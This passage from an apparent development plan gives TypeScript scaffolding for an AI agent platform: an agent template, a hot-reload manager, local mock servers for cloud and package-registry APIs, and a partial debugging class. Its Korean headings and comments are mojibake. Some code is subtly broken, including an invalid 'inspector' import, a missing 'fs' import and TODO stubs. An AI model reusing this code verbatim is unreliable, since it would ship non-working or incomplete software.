      throw error;
    }
  }
  
  private validateInput(input: any): void {
    // TODO: Implement input validation
    if (!input) {
      throw new Error('Input is required');
    }
  }
  
  private async process(input: any): Promise<any> {
    // TODO: Implement processing logic
    {{#if_eq type 'processing'}}
    // Processing agent logic
    return this.processData(input);
    {{/if_eq}}
    {{#if_eq type 'analysis'}}
    // Analysis agent logic
    return this.analyzeData(input);
    {{/if_eq}}
    {{#if_eq type 'generation'}}
    // Generation agent logic
    return this.generateOutput(input);
    {{/if_eq}}
    {{#if_eq type 'integration'}}
    // Integration agent logic
    return this.integrateServices(input);
    {{/if_eq}}
  }
  
  {{#if_eq type 'processing'}}
  private async processData(data: any): Promise<any> {
    // TODO: Implement data processing
    return data;
  }
  {{/if_eq}}
  
  {{#if_eq type 'analysis'}}
  private async analyzeData(data: any): Promise<any> {
    // TODO: Implement data analysis
    return { analyzed: true };
  }
  {{/if_eq}}
  
  {{#if_eq type 'generation'}}
  private async generateOutput(input: any): Promise<any> {
    // TODO: Implement output generation
    return { generated: true };
  }
  {{/if_eq}}
  
  {{#if_eq type 'integration'}}
  private async integrateServices(input: any): Promise<any> {
    // TODO: Implement service integration
    return { integrated: true };
  }
  {{/if_eq}}
}
```
---

### SubTask 0.12.2: Hot Module Replacement (HMR) ì„¤ì •
**ëª©í‘œ**: ê°œë°œ ì¤‘ ë¹ ë¥¸ í”¼ë“œë°±ì„ ìœ„í•œ HMR êµ¬ì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/dev/hot-reload.ts
import { spawn, ChildProcess } from 'child_process';
import chokidar from 'chokidar';
import { EventEmitter } from 'events';
import path from 'path';
import { logger } from '../config/logger';
import WebSocket from 'ws';

// HMR ë§¤ë‹ˆì €
export class HotModuleReplacementManager extends EventEmitter {
  private watcher?: chokidar.FSWatcher;
  private process?: ChildProcess;
  private wsServer?: WebSocket.Server;
  private reloadTimer?: NodeJS.Timeout;
  private isRestarting = false;
  
  constructor(private config: HMRConfig) {
    super();
  }
  
  // HMR ì‹œì‘
  async start(): Promise<void> {
    logger.info('Starting Hot Module Replacement...');
    
    // WebSocket ì„œë²„ ì‹œì‘ (ë¸Œë¼ìš°ì € ìƒˆë¡œê³ ì¹¨ìš©)
    this.startWebSocketServer();
    
    // ì´ˆê¸° í”„ë¡œì„¸ìŠ¤ ì‹œì‘
    await this.startProcess();
    
    // íŒŒì¼ ê°ì‹œ ì‹œì‘
    this.startWatching();
  }
  
  // WebSocket ì„œë²„
  private startWebSocketServer(): void {
    this.wsServer = new WebSocket.Server({ port: this.config.wsPort || 3001 });
    
    this.wsServer.on('connection', (ws) => {
      logger.debug('HMR client connected');
      
      ws.on('close', () => {
        logger.debug('HMR client disconnected');
      });
    });
  }
  
  // íŒŒì¼ ê°ì‹œ
  private startWatching(): void {
    const watchPaths = this.config.watchPaths || ['src'];
    const ignorePaths = this.config.ignorePaths || [
      'node_modules',
      'dist',
      'coverage',
      '.git',
      '**/*.test.ts',
      '**/*.spec.ts'
    ];
    
    this.watcher = chokidar.watch(watchPaths, {
      ignored: ignorePaths,
      persistent: true,
      ignoreInitial: true,
      awaitWriteFinish: {
        stabilityThreshold: 300,
        pollInterval: 100
      }
    });
    
    // íŒŒì¼ ë³€ê²½ ì´ë²¤íŠ¸
    this.watcher.on('change', (filePath) => this.handleFileChange(filePath));
    this.watcher.on('add', (filePath) => this.handleFileChange(filePath));
    this.watcher.on('unlink', (filePath) => this.handleFileChange(filePath));
  }
  
  // íŒŒì¼ ë³€ê²½ ì²˜ë¦¬
  private handleFileChange(filePath: string): void {
    logger.info(`File changed: ${filePath}`);
    
    // ë””ë°”ìš´ì‹±
    if (this.reloadTimer) {
      clearTimeout(this.reloadTimer);
    }
    
    this.reloadTimer = setTimeout(() => {
      const ext = path.extname(filePath);
      
      if (this.config.hotReloadableExtensions?.includes(ext)) {
        // Hot reload ê°€ëŠ¥í•œ íŒŒì¼
        this.hotReload(filePath);
      } else {
        // ì „ì²´ ì¬ì‹œì‘ í•„ìš”
        this.restartProcess();
      }
    }, this.config.debounceDelay || 100);
  }
  
  // Hot reload ìˆ˜í–‰
  private async hotReload(filePath: string): Promise<void> {
    try {
      // ìºì‹œì—ì„œ ëª¨ë“ˆ ì œê±°
      this.clearModuleCache(filePath);
      
      // ëª¨ë“ˆ íŠ¹ì • í•« ë¦¬ë¡œë“œ ë¡œì§
      if (filePath.includes('/agents/')) {
        await this.reloadAgent(filePath);
      } else if (filePath.includes('/routes/')) {
        await this.reloadRoute(filePath);
      } else if (filePath.includes('/services/')) {
        await this.reloadService(filePath);
      } else {
        // ê¸°ë³¸ í•« ë¦¬ë¡œë“œ
        this.emit('module:reload', filePath);
      }
      
      // ë¸Œë¼ìš°ì € ìƒˆë¡œê³ ì¹¨
      this.notifyClients('reload');
      
      logger.info(`Hot reloaded: ${filePath}`);
      
    } catch (error) {
      logger.error('Hot reload failed:', error);
      // ì‹¤íŒ¨ ì‹œ ì „ì²´ ì¬ì‹œì‘
      this.restartProcess();
    }
  }
  
  // ì—ì´ì „íŠ¸ ë¦¬ë¡œë“œ
  private async reloadAgent(filePath: string): Promise<void> {
    const agentName = path.basename(filePath, '.ts').replace('-agent', '');
    
    // ì—ì´ì „íŠ¸ ë§¤ë‹ˆì €ì— ë¦¬ë¡œë“œ ìš”ì²­
    if (global.agentManager) {
      await global.agentManager.reloadAgent(agentName);
    }
  }
  
  // ë¼ìš°íŠ¸ ë¦¬ë¡œë“œ
  private async reloadRoute(filePath: string): Promise<void> {
    // Express ë¼ìš°í„° ì¬ë“±ë¡
    if (global.app) {
      const routeName = path.basename(filePath, '.ts');
      delete require.cache[require.resolve(filePath)];
      const newRouter = require(filePath).default;
      
      // ê¸°ì¡´ ë¼ìš°íŠ¸ ì œê±° ë° ìƒˆ ë¼ìš°íŠ¸ ë“±ë¡
      global.app._router.stack = global.app._router.stack.filter(
        (layer: any) => !layer.regexp.test(`/${routeName}`)
      );
      global.app.use(`/api/${routeName}`, newRouter);
    }
  }
  
  // ì„œë¹„ìŠ¤ ë¦¬ë¡œë“œ
  private async reloadService(filePath: string): Promise<void> {
    const serviceName = path.basename(filePath, '.ts');
    
    // ì„œë¹„ìŠ¤ ì»¨í…Œì´ë„ˆì—ì„œ ì¬ë“±ë¡
    if (global.serviceContainer) {
      delete require.cache[require.resolve(filePath)];
      const ServiceClass = require(filePath).default;
      global.serviceContainer.register(serviceName, new ServiceClass());
    }
  }
  
  // ëª¨ë“ˆ ìºì‹œ ì œê±°
  private clearModuleCache(filePath: string): void {
    const resolvedPath = require.resolve(filePath);
    delete require.cache[resolvedPath];
    
    // ì˜ì¡´ì„±ë„ í•¨ê»˜ ì œê±°
    Object.keys(require.cache).forEach((key) => {
      if (require.cache[key]?.children.some(child => child.id === resolvedPath)) {
        delete require.cache[key];
      }
    });
  }
  
  // í”„ë¡œì„¸ìŠ¤ ì¬ì‹œì‘
  private async restartProcess(): Promise<void> {
    if (this.isRestarting) return;
    
    this.isRestarting = true;
    logger.info('Restarting application...');
    
    // ê¸°ì¡´ í”„ë¡œì„¸ìŠ¤ ì¢…ë£Œ
    if (this.process) {
      await this.stopProcess();
    }
    
    // ìƒˆ í”„ë¡œì„¸ìŠ¤ ì‹œì‘
    await this.startProcess();
    
    this.isRestarting = false;
    this.notifyClients('restart');
  }
  
  // í”„ë¡œì„¸ìŠ¤ ì‹œì‘
  private async startProcess(): Promise<void> {
    const command = this.config.command || 'npm';
    const args = this.config.args || ['run', 'dev'];
    
    this.process = spawn(command, args, {
      stdio: 'inherit',
      env: {
        ...process.env,
        NODE_ENV: 'development',
        HMR_ENABLED: 'true'
      }
    });
    
    this.process.on('exit', (code) => {
      if (code !== 0 && !this.isRestarting) {
        logger.error(`Process exited with code ${code}`);
        setTimeout(() => this.restartProcess(), 1000);
      }
    });
    
    // í”„ë¡œì„¸ìŠ¤ ì¤€ë¹„ ëŒ€ê¸°
    await this.waitForProcessReady();
  }
  
  // í”„ë¡œì„¸ìŠ¤ ì¢…ë£Œ
  private async stopProcess(): Promise<void> {
    if (!this.process) return;
    
    return new Promise((resolve) => {
      this.process!.once('exit', resolve);
      this.process!.kill('SIGTERM');
      
      // ê°•ì œ ì¢…ë£Œ íƒ€ì´ë¨¸
      setTimeout(() => {
        if (this.process) {
          this.process.kill('SIGKILL');
        }
        resolve(undefined);
      }, 5000);
    });
  }
  
  // í”„ë¡œì„¸ìŠ¤ ì¤€ë¹„ ëŒ€ê¸°
  private async waitForProcessReady(): Promise<void> {
    const maxAttempts = 30;
    const checkInterval = 1000;
    
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const response = await fetch(`http://localhost:${this.config.appPort || 3000}/health`);
        if (response.ok) {
          logger.info('Application is ready');
          return;
        }
      } catch (error) {
        // ì•„ì§ ì¤€ë¹„ë˜ì§€ ì•ŠìŒ
      }
      
      await new Promise(resolve => setTimeout(resolve, checkInterval));
    }
    
    throw new Error('Application failed to start');
  }
  
  // í´ë¼ì´ì–¸íŠ¸ì— ì•Œë¦¼
  private notifyClients(action: string): void {
    if (!this.wsServer) return;
    
    const message = JSON.stringify({ action, timestamp: Date.now() });
    
    this.wsServer.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  }
  
  // HMR ì¤‘ì§€
  async stop(): Promise<void> {
    logger.info('Stopping Hot Module Replacement...');
    
    if (this.watcher) {
      await this.watcher.close();
    }
    
    if (this.process) {
      await this.stopProcess();
    }
    
    if (this.wsServer) {
      this.wsServer.close();
    }
  }
}

// TypeScript ë³€í™˜ê¸°
export class TypeScriptTranspiler {
  private tsNode: any;
  
  constructor() {
    this.tsNode = require('ts-node').register({
      transpileOnly: true,
      compilerOptions: {
        module: 'commonjs',
        target: 'es2020',
        lib: ['es2020'],
        allowJs: true,
        esModuleInterop: true,
        skipLibCheck: true
      }
    });
  }
  
  // ëŸ°íƒ€ì„ ë³€í™˜
  transpile(code: string, fileName: string): string {
    const ts = require('typescript');
    
    const result = ts.transpileModule(code, {
      compilerOptions: {
        module: ts.ModuleKind.CommonJS,
        target: ts.ScriptTarget.ES2020,
        esModuleInterop: true
      },
      fileName
    });
    
    return result.outputText;
  }
  
  // require í›… ì„¤ì¹˜
  installRequireHook(): void {
    const Module = require('module');
    const originalRequire = Module.prototype.require;
    
    Module.prototype.require = function(id: string) {
      // HMRì´ í™œì„±í™”ëœ ëª¨ë“ˆì¸ì§€ í™•ì¸
      if (global.HMR_MODULES?.has(id)) {
        logger.debug(`HMR: Loading module ${id}`);
        
        // ìºì‹œ ë¬´íš¨í™”
        delete require.cache[require.resolve(id)];
      }
      
      return originalRequire.apply(this, arguments);
    };
  }
}

// í”„ë¡ íŠ¸ì—”ë“œ HMR í´ë¼ì´ì–¸íŠ¸
export const hmrClient = `
(function() {
  const ws = new WebSocket('ws://localhost:3001');
  
  ws.onopen = () => {
    console.log('[HMR] Connected');
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    switch (data.action) {
      case 'reload':
        console.log('[HMR] Reloading page...');
        window.location.reload();
        break;
        
      case 'restart':
        console.log('[HMR] Server restarted');
        // ì¬ì—°ê²° ì‹œë„
        setTimeout(() => {
          window.location.reload();
        }, 1000);
        break;
        
      case 'css':
        console.log('[HMR] Updating CSS...');
        updateCSS(data.file);
        break;
    }
  };
  
  ws.onclose = () => {
    console.log('[HMR] Disconnected. Retrying...');
    setTimeout(() => {
      window.location.reload();
    }, 2000);
  };
  
  function updateCSS(file) {
    const links = document.querySelectorAll('link[rel="stylesheet"]');
    const link = Array.from(links).find(l => l.href.includes(file));
    
    if (link) {
      const newLink = link.cloneNode();
      newLink.href = link.href.split('?')[0] + '?t=' + Date.now();
      link.parentNode.replaceChild(newLink, link);
    }
  }
})();
`;

// HMR ì„¤ì • íƒ€ì…
interface HMRConfig {
  watchPaths?: string[];
  ignorePaths?: string[];
  hotReloadableExtensions?: string[];
  debounceDelay?: number;
  command?: string;
  args?: string[];
  appPort?: number;
  wsPort?: number;
}

// Express ì•±ì— HMR ë¯¸ë“¤ì›¨ì–´ ì¶”ê°€
export function setupHMRMiddleware(app: any): void {
  if (process.env.NODE_ENV !== 'development') return;
  
  // HMR í´ë¼ì´ì–¸íŠ¸ ì£¼ì…
  app.use((req: any, res: any, next: any) => {
    if (req.path.endsWith('.html')) {
      const originalSend = res.send;
      res.send = function(html: string) {
        if (typeof html === 'string' && html.includes('</body>')) {
          html = html.replace('</body>', `<script>${hmrClient}</script></body>`);
        }
        originalSend.call(this, html);
      };
    }
    next();
  });
  
  // ì „ì—­ ê°ì²´ ì„¤ì •
  global.app = app;
  global.HMR_MODULES = new Set();
}
```

### SubTask 0.12.3: ê°œë°œìš© ë°ì´í„° ëª¨í‚¹ ì‹œìŠ¤í…œ
**ëª©í‘œ**: ì™¸ë¶€ ì˜ì¡´ì„± ì—†ì´ ê°œë°œí•  ìˆ˜ ìˆëŠ” ëª¨í‚¹ ì‹œìŠ¤í…œ

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/dev/mock-system.ts
import { faker } from '@faker-js/faker';
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';

// ëª¨í‚¹ ì„œë¹„ìŠ¤ ë§¤ë‹ˆì €
export class MockServiceManager {
  private mockServers: Map<string, any> = new Map();
  private mockData: Map<string, any> = new Map();
  
  // ëª¨ë“  ëª¨í‚¹ ì„œë¹„ìŠ¤ ì‹œì‘
  async startAll(): Promise<void> {
    await Promise.all([
      this.startBedrockMock(),
      this.startDynamoDBMock(),
      this.startS3Mock(),
      this.startExternalAPIMocks()
    ]);
    
    console.log('âœ… All mock services started');
  }
  
  // Bedrock API ëª¨í‚¹
  private async startBedrockMock(): Promise<void> {
    const app = express();
    app.use(express.json());
    
    // Claude ëª¨ë¸ ì‘ë‹µ ëª¨í‚¹
    app.post('/model/anthropic.claude-*/invoke', async (req, res) => {
      const { prompt } = req.body;
      
      // ì§€ì—° ì‹œë®¬ë ˆì´ì…˜
      await this.simulateLatency(500, 2000);
      
      // ëª¨ì˜ ì‘ë‹µ ìƒì„±
      const response = this.generateMockLLMResponse(prompt);
      
      res.json({
        completion: response,
        stop_reason: 'stop_sequence',
        model: req.params[0],
        usage: {
          input_tokens: prompt.split(' ').length * 1.3,
          output_tokens: response.split(' ').length * 1.3
        }
      });
    });
    
    const server = app.listen(4567, () => {
      console.log('ğŸ¤– Bedrock mock server running on port 4567');
    });
    
    this.mockServers.set('bedrock', server);
  }
  
  // DynamoDB ëª¨í‚¹
  private async startDynamoDBMock(): Promise<void> {
    const app = express();
    app.use(express.json());
    
    // í…Œì´ë¸”ë³„ ë°ì´í„° ì €ì¥ì†Œ
    const tables: Map<string, any[]> = new Map();
    
    // PutItem
    app.post('/tables/:tableName/items', (req, res) => {
      const { tableName } = req.params;
      const item = req.body.Item;
      
      if (!tables.has(tableName)) {
        tables.set(tableName, []);
      }
      
      const tableData = tables.get(tableName)!;
      const existingIndex = tableData.findIndex(i => i.id === item.id);
      
      if (existingIndex >= 0) {
        tableData[existingIndex] = item;
      } else {
        tableData.push(item);
      }
      
      res.json({ Attributes: item });
    });
    
    // GetItem
    app.get('/tables/:tableName/items/:id', (req, res) => {
      const { tableName, id } = req.params;
      const tableData = tables.get(tableName) || [];
      const item = tableData.find(i => i.id === id);
      
      if (item) {
        res.json({ Item: item });
      } else {
        res.status(404).json({ message: 'Item not found' });
      }
    });
    
    // Query
    app.post('/tables/:tableName/query', (req, res) => {
      const { tableName } = req.params;
      const { KeyConditionExpression, ExpressionAttributeValues } = req.body;
      
      const tableData = tables.get(tableName) || [];
      
      // ê°„ë‹¨í•œ ì¿¼ë¦¬ ì‹œë®¬ë ˆì´ì…˜
      const results = tableData.filter(item => {
        // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” KeyConditionExpression íŒŒì‹± í•„ìš”
        return true;
      });
      
      res.json({
        Items: results,
        Count: results.length,
        ScannedCount: results.length
      });
    });
    
    const server = app.listen(8000, () => {
      console.log('ğŸ—ƒï¸  DynamoDB mock server running on port 8000');
    });
    
    this.mockServers.set('dynamodb', server);
    
    // ì´ˆê¸° ë°ì´í„° ì‹œë”©
    await this.seedDynamoDBData(tables);
  }
  
  // S3 ëª¨í‚¹
  private async startS3Mock(): Promise<void> {
    const app = express();
    app.use(express.json());
    app.use(express.raw({ type: '*/*', limit: '100mb' }));
    
    const buckets: Map<string, Map<string, any>> = new Map();
    
    // CreateBucket
    app.put('/:bucket', (req, res) => {
      const { bucket } = req.params;
      
      if (!buckets.has(bucket)) {
        buckets.set(bucket, new Map());
        res.status(200).send();
      } else {
        res.status(409).json({ 
          Code: 'BucketAlreadyExists',
          Message: 'The requested bucket name is not available'
        });
      }
    });
    
    // PutObject
    app.put('/:bucket/:key(*)', (req, res) => {
      const { bucket, key } = req.params;
      
      if (!buckets.has(bucket)) {
        return res.status(404).json({ Code: 'NoSuchBucket' });
      }
      
      const bucketData = buckets.get(bucket)!;
      bucketData.set(key, {
        Body: req.body,
        ContentType: req.headers['content-type'],
        ContentLength: req.body.length,
        ETag: `"${faker.string.alphanumeric(32)}"`,
        LastModified: new Date().toISOString()
      });
      
      res.json({ ETag: bucketData.get(key).ETag });
    });
    
    // GetObject
    app.get('/:bucket/:key(*)', (req, res) => {
      const { bucket, key } = req.params;
      
      if (!buckets.has(bucket)) {
        return res.status(404).json({ Code: 'NoSuchBucket' });
      }
      
      const bucketData = buckets.get(bucket)!;
      const object = bucketData.get(key);
      
      if (!object) {
        return res.status(404).json({ Code: 'NoSuchKey' });
      }
      
      res.set({
        'Content-Type': object.ContentType,
        'Content-Length': object.ContentLength,
        'ETag': object.ETag,
        'Last-Modified': object.LastModified
      });
      
      res.send(object.Body);
    });
    
    const server = app.listen(4568, () => {
      console.log('â˜ï¸  S3 mock server running on port 4568');
    });
    
    this.mockServers.set('s3', server);
  }
  
  // ì™¸ë¶€ API ëª¨í‚¹
  private async startExternalAPIMocks(): Promise<void> {
    const app = express();
    app.use(express.json());
    
    // NPM Registry ëª¨í‚¹
    app.get('/npm/:package', (req, res) => {
      const packageInfo = this.generateMockNPMPackage(req.params.package);
      res.json(packageInfo);
    });
    
    // GitHub API ëª¨í‚¹
    app.get('/github/repos/:owner/:repo', (req, res) => {
      const repoInfo = this.generateMockGitHubRepo(req.params.owner, req.params.repo);
      res.json(repoInfo);
    });
    
    // PyPI ëª¨í‚¹
    app.get('/pypi/:package', (req, res) => {
      const packageInfo = this.generateMockPyPIPackage(req.params.package);
      res.json(packageInfo);
    });
    
    const server = app.listen(4569, () => {
      console.log('ğŸŒ External API mock server running on port 4569');
    });
    
    this.mockServers.set('external', server);
  }
  
  // ëª¨ì˜ LLM ì‘ë‹µ ìƒì„±
  private generateMockLLMResponse(prompt: string): string {
    const responses: Record<string, string> = {
      'analyze': 'Based on my analysis, this appears to be a web application project that requires user authentication, data storage, and a RESTful API.',
      'generate': 'Here\'s the generated code:\n\n```javascript\nclass ExampleService {\n  async getData() {\n    return { success: true, data: [] };\n  }\n}\n```',
      'default': faker.lorem.paragraphs(2)
    };
    
    const keyword = Object.keys(responses).find(k => prompt.toLowerCase().includes(k));
    return responses[keyword || 'default'];
  }
  
  // NPM íŒ¨í‚¤ì§€ ì •ë³´ ìƒì„±
  private generateMockNPMPackage(packageName: string): any {
    return {
      name: packageName,
      version: faker.system.semver(),
      description: faker.lorem.sentence(),
      keywords: faker.lorem.words(5).split(' '),
      author: faker.person.fullName(),
      license: faker.helpers.arrayElement(['MIT', 'Apache-2.0', 'GPL-3.0']),
      repository: {
        type: 'git',
        url: `https://github.com/${faker.internet.userName()}/${packageName}`
      },
      dependencies: this.generateMockDependencies(),
      devDependencies: this.generateMockDependencies(),
      downloads: {
        weekly: faker.number.int({ min: 1000, max: 1000000 })
      }
    };
  }
  
  // GitHub ë¦¬í¬ì§€í† ë¦¬ ì •ë³´ ìƒì„±
  private generateMockGitHubRepo(owner: string, repo: string): any {
    return {
      id: faker.number.int({ min: 1000000, max: 9999999 }),
      name: repo,
      full_name: `${owner}/${repo}`,
      owner: {
        login: owner,
        avatar_url: faker.image.avatar()
      },
      description: faker.lorem.sentence(),
      fork: false,
      created_at: faker.date.past().toISOString(),
      updated_at: faker.date.recent().toISOString(),
      pushed_at: faker.date.recent().toISOString(),
      stargazers_count: faker.number.int({ min: 0, max: 50000 }),
      watchers_count: faker.number.int({ min: 0, max: 5000 }),
      forks_count: faker.number.int({ min: 0, max: 10000 }),
      language: faker.helpers.arrayElement(['JavaScript', 'TypeScript', 'Python', 'Java', 'Go']),
      license: {
        key: 'mit',
        name: 'MIT License'
      }
    };
  }
  
  // PyPI íŒ¨í‚¤ì§€ ì •ë³´ ìƒì„±
  private generateMockPyPIPackage(packageName: string): any {
    return {
      info: {
        name: packageName,
        version: faker.system.semver(),
        summary: faker.lorem.sentence(),
        author: faker.person.fullName(),
        author_email: faker.internet.email(),
        license: faker.helpers.arrayElement(['MIT', 'Apache-2.0', 'GPL-3.0']),
        keywords: faker.lorem.words(5),
        classifiers: [
          'Development Status :: 4 - Beta',
          'Intended Audience :: Developers',
          'Programming Language :: Python :: 3'
        ]
      },
      releases: this.generateMockReleases()
    };
  }
  
  // ì˜ì¡´ì„± ìƒì„±
  private generateMockDependencies(): Record<string, string> {
    const deps: Record<string, string> = {};
    const count = faker.number.int({ min: 3, max: 10 });
    
    for (let i = 0; i < count; i++) {
      const packageName = faker.helpers.arrayElement([
        'express', 'react', 'vue', 'lodash', 'axios',
        'moment', 'uuid', 'bcrypt', 'jsonwebtoken', 'dotenv'
      ]);
      deps[packageName] = `^${faker.system.semver()}`;
    }
    
    return deps;
  }
  
  // ë¦´ë¦¬ìŠ¤ ì •ë³´ ìƒì„±
  private generateMockReleases(): Record<string, any[]> {
    const releases: Record<string, any[]> = {};
    const versionCount = faker.number.int({ min: 3, max: 10 });
    
    for (let i = 0; i < versionCount; i++) {
      const version = faker.system.semver();
      releases[version] = [{
        filename: `package-${version}.tar.gz`,
        size: faker.number.int({ min: 10000, max: 1000000 }),
        upload_time: faker.date.past().toISOString()
      }];
    }
    
    return releases;
  }
  
  // DynamoDB ì´ˆê¸° ë°ì´í„° ì‹œë”©
  private async seedDynamoDBData(tables: Map<string, any[]>): Promise<void> {
    // Projects í…Œì´ë¸”
    const projects = [];
    for (let i = 0; i < 20; i++) {
      projects.push({
        id: `proj_${faker.string.uuid()}`,
        name: faker.commerce.productName(),
        description: faker.lorem.paragraph(),
        status: faker.helpers.arrayElement(['analyzing', 'building', 'completed']),
        createdAt: faker.date.past().toISOString()
      });
    }
    tables.set('T-Developer-Projects', projects);
    
    // Components í…Œì´ë¸”
    const components = [];
    for (let i = 0; i < 50; i++) {
      components.push({
        id: `comp_${faker.string.uuid()}`,
        name: faker.hacker.noun(),
        version: faker.system.semver(),
        language: faker.helpers.arrayElement(['javascript', 'typescript', 'python']),
        downloads: faker.number.int({ min: 100, max: 100000 })
      });
    }
    tables.set('T-Developer-Components', components);
  }
  
  // ì§€ì—° ì‹œë®¬ë ˆì´ì…˜
  private async simulateLatency(min: number, max: number): Promise<void> {
    const delay = faker.number.int({ min, max });
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  // ëª¨ë“  ëª¨í‚¹ ì„œë¹„ìŠ¤ ì¤‘ì§€
  async stopAll(): Promise<void> {
    for (const [name, server] of this.mockServers) {
      server.close();
      console.log(`ğŸ›‘ ${name} mock server stopped`);
    }
    
    this.mockServers.clear();
    this.mockData.clear();
  }
}

// WebSocket ëª¨í‚¹
export class WebSocketMockServer {
  private io: Server;
  
  constructor(httpServer: any) {
    this.io = new Server(httpServer, {
      cors: {
        origin: '*',
        methods: ['GET', 'POST']
      }
    });
    
    this.setupHandlers();
  }
  
  private setupHandlers(): void {
    this.io.on('connection', (socket) => {
      console.log('Mock WebSocket client connected');
      
      // í”„ë¡œì íŠ¸ ìƒíƒœ ì—…ë°ì´íŠ¸ ì‹œë®¬ë ˆì´ì…˜
      this.simulateProjectUpdates(socket);
      
      // ì—ì´ì „íŠ¸ ì‹¤í–‰ ìƒíƒœ ì‹œë®¬ë ˆì´ì…˜
      this.simulateAgentExecutions(socket);
      
      socket.on('disconnect', () => {
        console.log('Mock WebSocket client disconnected');
      });
    });
  }
  
  private simulateProjectUpdates(socket: any): void {
    const projectId = `proj_${faker.string.uuid()}`;
    const statuses = ['analyzing', 'designing', 'building', 'testing', 'completed'];
    let currentIndex = 0;
    
    const interval = setInterval(() => {
      if (currentIndex >= statuses.length) {
        clearInterval(interval);
        return;
      }
      
      socket.emit('project:update', {
        projectId,
        status: statuses[currentIndex],
        progress: (currentIndex + 1) / statuses.length * 100,
        timestamp: new Date().toISOString()
      });
      
      currentIndex++;
    }, 3000);
  }
  
  private simulateAgentExecutions(socket: any): void {
    const agents = [
      'nl-input', 'ui-selection', 'parsing', 'component-decision',
      'matching-rate', 'search', 'generation', 'assembly', 'download'
    ];
    
    agents.forEach((agent, index) => {
      setTimeout(() => {
        socket.emit('agent:start', {
          agentName: agent,
          timestamp: new Date().toISOString()
        });
        
        setTimeout(() => {
          socket.emit('agent:complete', {
            agentName: agent,
            result: 'success',
            duration: faker.number.int({ min: 1000, max: 5000 }),
            timestamp: new Date().toISOString()
          });
        }, faker.number.int({ min: 2000, max: 8000 }));
      }, index * 2000);
    });
  }
}

// ëª¨í‚¹ ì„¤ì •
export const mockConfig = {
  enabled: process.env.USE_MOCKS === 'true',
  services: {
    bedrock: process.env.MOCK_BEDROCK === 'true',
    dynamodb: process.env.MOCK_DYNAMODB === 'true',
    s3: process.env.MOCK_S3 === 'true',
    external: process.env.MOCK_EXTERNAL_APIS === 'true'
  },
  endpoints: {
    bedrock: 'http://localhost:4567',
    dynamodb: 'http://localhost:8000',
    s3: 'http://localhost:4568',
    npm: 'http://localhost:4569/npm',
    github: 'http://localhost:4569/github',
    pypi: 'http://localhost:4569/pypi'
  }
};
```
---

### SubTask 0.12.4: ë””ë²„ê¹… ë„êµ¬ í†µí•©
**ëª©í‘œ**: íš¨ìœ¨ì ì¸ ë””ë²„ê¹…ì„ ìœ„í•œ ë„êµ¬ ë° ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/dev/debugging-tools.ts
import { InspectorSession } from 'inspector';
import { performance } from 'perf_hooks';
import { AsyncLocalStorage } from 'async_hooks';
import util from 'util';
import chalk from 'chalk';

// íŠ¸ë ˆì´ìŠ¤ ì»¨í…ìŠ¤íŠ¸ ê´€ë¦¬
export const traceContext = new AsyncLocalStorage<TraceContext>();

interface TraceContext {
  traceId: string;
  spanId: string;
  parentSpanId?: string;
  startTime: number;
  metadata: Record<string, any>;
}

// ê³ ê¸‰ ë””ë²„ê±°
export class AdvancedDebugger {
  private session: InspectorSession;
  private breakpoints: Map<string, Breakpoint> = new Map();
  private profiles: Map<string, any> = new Map();
  
  constructor() {
    this.session = new InspectorSession();
    this.session.connect();
  }
  
  // ì¡°ê±´ë¶€ ë¸Œë ˆì´í¬í¬ì¸íŠ¸ ì„¤ì •
  async setConditionalBreakpoint(
    file: string,
    line: number,
    condition: string,
    logMessage?: string
  ): Promise<void> {
    const scriptId = await this.getScriptId(file);
    
    await this.post('Debugger.setBreakpoint', {
      location: {
        scriptId,
        lineNumber: line - 1
      },
      condition
    });
    
    this.breakpoints.set(`${file}:${line}`, {
      file,
      line,
      condition,
      logMessage,
      hitCount: 0
    });
    
    if (logMessage) {
      // ë¡œê·¸ ë¸Œë ˆì´í¬í¬ì¸íŠ¸
      await this.post('Runtime.addBinding', {
        name: 'logpoint',
        executionContextId: 1
      });
    }
  }
  
  // ì„±ëŠ¥ í”„ë¡œíŒŒì¼ë§ ì‹œì‘
  async startProfiling(profileName: string): Promise<void> {
    await this.post('Profiler.enable');
    await this.post('Profiler.start');
    
    this.profiles.set(profileName, {
      startTime: Date.now(),
      name: profileName
    });
  }
  
  // ì„±ëŠ¥ í”„ë¡œíŒŒì¼ë§ ì¤‘ì§€
  async stopProfiling(profileName: string): Promise<CPUProfile> {
    const result = await this.post('Profiler.stop');
    await this.post('Profiler.disable');
    
    const profile = this.profiles.get(profileName);
    if (profile) {
      profile.endTime = Date.now();
      profile.data = result.profile;
    }
    
    return this.analyzeCPUProfile(result.profile);
  }
  
  // ë©”ëª¨ë¦¬ ìŠ¤ëƒ…ìƒ·
  async takeHeapSnapshot(tag?: string): Promise<string> {
    await this.post('HeapProfiler.enable');
    
    const chunks: string[] = [];
    
    this.session.on('HeapProfiler.addHeapSnapshotChunk', (message) => {
      chunks.push(message.params.chunk);
    });
    
    await this.post('HeapProfiler.takeHeapSnapshot', {
      reportProgress: true,
      treatGlobalObjectsAsRoots: true
    });
    
    await this.post('HeapProfiler.disable');
    
    const snapshot = chunks.join('');
    const filename = `heapsnapshot-${tag || Date.now()}.json`;
    
    await fs.writeFile(filename, snapshot);
    
    return filename;
  }
  
  // ë¹„ë™ê¸° ìŠ¤íƒ íŠ¸ë ˆì´ìŠ¤ í™œì„±í™”
  async enableAsyncStackTraces(): Promise<void> {
    await this.post('Debugger.enable');
    await this.post('Debugger.setAsyncCallStackDepth', { maxDepth: 32 });
  }
  
  // ëŸ°íƒ€ì„ í‰ê°€
  async evaluate(expression: string, contextId?: number): Promise<any> {
    const result = await this.post('Runtime.evaluate', {
      expression,
      generatePreview: true,
      includeCommandLineAPI: true,
      contextId
    });
    
    if (result.exceptionDetails) {
      throw new Error(result.exceptionDetails.text);
    }
    
    return result.result.value;
  }
  
  // CPU í”„ë¡œíŒŒì¼ ë¶„ì„
  private analyzeCPUProfile(profile: any): CPUProfile {
    const nodes = new Map<number, any>();
    let totalTime = 0;
    
